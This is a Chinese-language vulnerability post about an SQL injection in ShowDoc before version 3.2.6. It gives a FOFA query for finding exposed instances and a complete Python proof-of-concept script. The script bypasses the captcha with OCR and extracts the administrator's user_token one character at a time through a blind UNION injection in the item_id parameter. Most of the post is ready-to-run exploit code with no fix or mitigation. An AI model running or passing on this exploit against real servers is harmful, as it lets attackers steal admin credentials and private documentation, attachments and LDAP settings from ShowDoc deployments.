## ShowDoc3.2.5存在SQL注入漏洞

ShowDoc 是基于thinkPHP开发的开源文档管理系统，支持使用 Markdown 语法书写API文档、数据字典、在线Excel文档等功能。
ShowDoc 3.2.6之前版本存在sql注入漏洞，在 Showdoc 的/server/index.php?s\=/api/item/pwd路径的item_id参数存在拼接执行逻辑，攻击者可利用 sql 注入爆破用户的 user_token，进而窃取管理员凭据，获取所有API文档、附件及LDAP等配置信息。

## fofa

```
app="ShowDoc"
```

## poc

```python
import argparse
import ddddocr
import requests
import onnxruntime
from urllib.parse import urljoin


onnxruntime.set_default_logger_severity(3)
table = '0123456789abcdef'
proxies = {'http': 'http://127.0.0.1:8085'}
ocr = ddddocr.DdddOcr()
ocr.set_ranges(table)


class RetryException(Exception):
    pass


def retry_when_failed(func):
    def retry_func(*args, **kwargs):
        while True:
            try:
                return func(*args, **kwargs)
            except RetryException:
                continue
            except Exception as e:
                raise e

    return retry_func


def generate_captcha(base: str):
    data = requests.get(f"{base}?s=/api/common/createCaptcha").json()
    captcha_id = data['data']['captcha_id']

    response = requests.get(f'{base}?s=/api/common/showCaptcha&captcha_id={captcha_id}')
    data = response.content
    result = ocr.classification(data)
    return captcha_id, result


@retry_when_failed
def exploit_one(base: str, current: str, ch: str) -> str:
    captcha_id, captcha_text = generate_captcha(base)
    data = requests.get(base, params={
        's': '/api/item/pwd',
        'page_id': '0',
        'password': '1',
        'captcha_id': captcha_id,
        'captcha': captcha_text,
        'item_id': f"aa') UNION SELECT 1,1,1,1,1,(SELECT 1 FROM user_token WHERE uid = 1 AND token LIKE '{current}{ch}%' LIMIT 1),1,1,1,1,1,1 FROM user_token; -- "
    }).json()

    if data['error_code'] == 0:
        return ch
    elif data['error_code'] == 10010:
        return ''
    elif data['error_code'] == 10206:
        raise RetryException()
    else:
        print(f'error: {data!r}')
        raise Exception('unknown exception')


def main():
    parser = argparse.ArgumentParser(description='Showdoc 3.2.5 SQL injection')
    parser.add_argument('-u', '--url', type=str, required=True)

    args = parser.parse_args()
    target = urljoin(args.url, '/server/index.php')
    res = ''
    for i in range(64):
        r = ''
        for ch in list(table):
            r = exploit_one(target, res, ch)
            if r:
                res += ch
                break

        print(f'Current result: {res}')
        if not r:
            break


if __name__ == '__main__':
    main()
```

![image-20240605084947972](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406050849021.png)